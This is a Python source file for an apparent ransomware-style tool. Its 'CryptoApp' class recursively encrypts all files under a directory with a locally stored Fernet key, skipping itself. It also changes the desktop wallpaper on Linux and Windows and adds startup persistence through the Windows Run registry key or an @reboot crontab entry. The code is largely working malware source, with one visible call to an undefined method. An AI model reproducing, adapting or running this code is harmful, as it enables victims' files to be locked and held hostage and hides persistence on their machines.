from cryptography.fernet import Fernet
from subprocess import call, run
from typing import Optional
import ctypes
import sys
import os
import signal
import json
import winreg


class CryptoApp:
    # CHECK
    def __init__(self, startPath: str = None):

        # Init the starting path, and change the current directory to it
        startPath: str = startPath or os.getcwd()
        os.chdir(startPath)

        KEY_PATH: str = '.key'

        # If the key exists, that means the files have been already encrypted
        if os.path.isfile(KEY_PATH):
            self.isEncrypted = True

            # Read the current fernet key
            self.key = self.readFile(KEY_PATH)
                
        # If the files were not encrypted
        else:
            self.isEncrypted = False
            self.key = Fernet.generate_key()

            # Write the fernet key to a file
            self.writeFile(KEY_PATH, self.key)
            

        # Initialize main variables
        self.omittedFiles = ['.key', 'CryptoApp.py', 'index.py', '.cron_copy', '__pycache__']
        self.extensionsToModify = []
        self.KEY_PATH = os.path.abspath(KEY_PATH)
        self.startingPath = startPath
        self.countFiles = 0
        self.countDirs = 0

        try:
            self.fernet = Fernet(self.key)
        except ValueError:

            # If the key is incorrect, delete it, and exit the program
            print('[ERROR] Incorrect key! You can forget about decryption')
            print('[INFO] Removing key...')
            os.remove(self.KEY_PATH)

            exit(1)



    # Run a shell script with an output
    def __getsh(self, command) -> any:
        try:
            result = run(command, capture_output=True, shell=True).stdout.decode('utf-8')
            return result

        except: return None


    # Run a shell script
    def __runsh(self, command: str) -> None:
        call(command, shell=True)


    # CHECK
    # Handle the encrypt/decrypt actions
    def __actionHandler(self) -> None:

        # Get the current directory files, and filter ones that shouldn't be modified
        files: list = list(filter(
            lambda x: x not in self.omittedFiles
            , os.listdir()
        )) 

        # Filter the file extensions
        # if len(self.extensionsToModify):
        files = list(filter(
            lambda x: x.endswith(tuple(self.extensionsToModify)) or os.path.isdir(x)
            , files
        ))


        # Loop through each file
        for path in files:
            try:
                # If the "path" is directory, change the working directory
                # Handle the files recursively, and finally return to the original directory
                if os.path.isdir(path):
                    # Save the current path, and increment the dir count
                    currentDir: str = os.getcwd()
                    self.countDirs += 1

                    os.chdir(path)
                    self.__actionHandler()   
                    os.chdir(currentDir)

                    continue             


                # Read the file contents
                old_text: str = self.readFile(path)
                if not old_text: continue


                # Encrypt or decrypt the file
                if self.isEncrypted:
                    new_text: str = self.fernet.decrypt(old_text)
                else:
                    new_text: str = self.fernet.encrypt(old_text)


                # Finally, write to the file its new content
                self.writeFile(path, new_text)
                print(f'[MOD] {path} - modified')

                # Increment the modified files count
                self.countFiles += 1


            except PermissionError:
                # Skip if there is a permission error
                print(f'[WARN] Not permitted to operate on: {path}')

            except:
                # Skip if something went wrong
                print(f'[ERROR] Could not modify file: {path}')



    # CHECK
    # Choose which files will be skipped during encryption
    def setFilesToSkip(self, files: list) -> None:
        self.omittedFiles.extend(files)


    # CHECK
    # Choose which file extensions will be encrypted (default any, which may cause very serious damage)
    def setExtensionsToModify(self, extensions: list) -> None:
        self.extensionsToModify.extend(extensions)



    # CHECK
    # Helper function for encrypting/decrypting
    def enc_dec_helper(self, type: str) -> None:
        action: Optional[str] = None

        if type == 'enc': action = 'Encrypting...'
        elif type == 'dec': action = 'Decrypting...'

        print(f'[START] {action}')
        self.__actionHandler()
        print(f'[FINISH] {action[:7]}ed {self.countFiles} files')



    # CHECK
    # Encrypt the files
    def encrypt(self) -> None:
        self.enc_dec_helper('enc')



    # CHECK
    # Decrypt the files
    def decrypt(self) -> None:
        self.enc_dec_helper('dec')

        os.remove(self.KEY_PATH)


    # CHECK
    # Determine the OS, and DE, if on Linux
    # Returns a list with a two elements that represent os and optionally desktop environment
    def determineOS(self) -> list:
        os_info: Optional[str] = None
        de: Optional[str] = None

        # Get the OS
        if sys.platform in ['linux2', 'linux']:
            os_info = 'linux'
        elif sys.platform == 'darwin':
            os_info = 'mac'
        elif sys.platform in ['win32', 'cygwin']:
            os_info = 'windows'

        # Get the DE
        if os_info == 'linux':
            match os.environ.get("DESKTOP_SESSION"):
                case 'ubuntu': de = 'gnome'
                case 'kubuntu': de = 'kde'
                case 'xfce': de = 'xfce4'
                case _: de = os.environ.get("DESKTOP_SESSION")

        return [os_info, de]            



    # Set the wallpaper image
    def setDesktopBG(self, target_os: str, target_de: str, file: str) -> None:
        try:
            abs_path: str = os.path.abspath(file)

            # Linux distros
            if target_os == 'linux':
                # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
                if target_de == 'xfce4':
                    for monitor in ['Virtual1', '0']:
                        self.__runsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{monitor}/workspace0/last-image -s {abs_path} 2>/dev/null')

                # GNOME
                if target_de == 'gnome':
                    for style in ['picture-uri', 'picture-uri-dark']:
                        self.__run(f'gsettings set org.gnome.desktop.background {style} file://{abs_path}')

            # Windows
            if target_os == 'windows':
                SPI_SET: int = 0x14

                ctypes.windll.user32.SystemParametersInfoW(SPI_SET, 0, abs_path, 0)

        except:
            print('[ERROR] Could not change a wallpaper')



    # Get the current wallpaper image
    def getDesktopBG(self, target_os: str, target_de: str) -> str | None:
        output = None

        try:
            # Linux distros
            if target_os == 'linux':
                # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
                if target_de == 'xfce4':
                    for x in ['Virtual1', '0']:
                        result = self.__getsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image')

                        # Remove the line break
                        output = result.rstrip()
                        if output: break

                # GNOME. Get the dark theme
                elif target_de == 'gnome':
                    result = self.__getsh('gsettings get org.gnome.desktop.background picture-uri-dark')
                    
                    # Remove the "file://" and '' to get a clear url
                    output: str = result.rstrip().replace('file://', '').replace("'", '')

            # Windows
            if target_os == 'windows':
                MAX: int = 260
                SPI_GET: int = 0x73

                buf = ctypes.create_unicode_buffer(MAX)
                ctypes.windll.user32.SystemParametersInfoW(SPI_GET, MAX, buf, 0)

                output = buf.value


            return output

        except:
            print('[ERROR] Could not get a wallpaper')


    # Launch a specified script on startup using windows registry (windows)
    def registryStartupAction(self, target_os: str, type: str, scriptToStart: str = '') -> None:
        # Check the OS
        if target_os != 'windows':
            print(f'[ERROR] Modyifying registry on {target_os}')
            return

        # Check if a script exists
        if not os.path.isfile(scriptToStart):
            print(f'[ERROR]: Script {scriptToStart} not found')
            return


        key:        str  = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key_name:   str  = 'win_reg_start'
        abs_path:   str  = os.path.abspath(scriptToStart)

        # Open the RUN registry
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            p, ex = os.path.splitext(abs_path)

            try:
                if type == 'start':
                    # .py extension script
                    if ex in ['.py', '.pyw']:
                        bat_path: str = f'{p}.bat'

                        # Create a batch file that executes user's script
                        with open(bat_path, 'w') as file:
                            file.write(f'@echo off\npython {abs_path} %*')

                        abs_path = bat_path

                    # Return if an extension is different than .bat
                    elif ex != '.bat':
                        print(f'[ERROR] {ex} extension is not supported')
                        return

                    # Set the registry and run the script immediately
                    winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, abs_path)
                    run([abs_path])

                # Remove a startup script from the registry
                elif type == 'stop':
                    winreg.DeleteValue(reg_key, key_name)

            except:
                print('[ERROR] Handling startup script failed')


    # Launch a specified script on startup using cron (unix like)
    def cronStartupAction(self, target_os: str, type: str, scriptToStart: str = '') -> None:
        # Check the OS
        if target_os not in ['linux', 'mac']:
            print(f'[ERROR] Running cron on {target_os}')
            return

        # Check if cron is installed
        doesExist: Optional[str] = self.__getsh('which crontab')
        if not doesExist or 'not found' in doesExist:
            print('[ERROR] cron is not installed on the system')
            return


        # File to save the original cron settings to
        CRON_ORIGINAL: str = '.cron_copy'

        if type == 'start':
            CRON_ARG: str = 'crontab_arg'

            # Check if a script exists
            if not os.path.isfile(scriptToStart):
                print(f'[ERROR]: Script {scriptToStart} not found')
                return

            scriptToStart = os.path.abspath(scriptToStart)

            # Get and save the current cron settings
            current: str = self.__getsh('crontab -l')
            self.writeFile(CRON_ORIGINAL, current)

            # Add a new entry
            current += f'\n@reboot python3 {scriptToStart}\n'
            self.writeFile(CRON_ARG, current)
            
            # Save the new cron settings and run the script
            self.__runsh(f'crontab {CRON_ARG}')
            self.__runsh(f'python3 {scriptToStart} &')
            os.remove(CRON_ARG)

        elif type == 'stop' and os.path.isfile(CRON_ORIGINAL):
            # Revert to the original cron settings
            self.__runsh(f'crontab {CRON_ORIGINAL}')
            os.remove(CRON_ORIGINAL)

            try:
                # Get the PID of the process
                pid: int = int(self.__getsh(f"ps -aux | grep {scriptToStart} | awk '{{print $2}}'").split('\n')[0])

                # And terminate that process
                if pid:
                    os.kill(pid, signal.SIGKILL)

            except: return



    # CHECK
    # Write to the file
    def writeFile(self, path: str, val: str) -> None:
        mode = 'wb' if isinstance(val, bytes) else 'w'

        with open(path, mode) as file:
            file.write(val)



    # CHECK
    # Read the file contents
    def readFile(self, path: str) -> str | None:
        try:
            with open(path, 'rb') as file:
                return file.read()

        except:
            raise Exception(f'[ERROR] File: {path} does not exist')


    # CHECK
    # Returns True, if the files were already encrypted (or if the key.txt is present)    
    def isAlreadyEncrypted(self) -> bool:
        return self.isEncrypted

    
    # CHECK
    def getCount(self) -> list:
    # Get a list of a total affected files and directories
        return [self.countFiles, self.countDirs]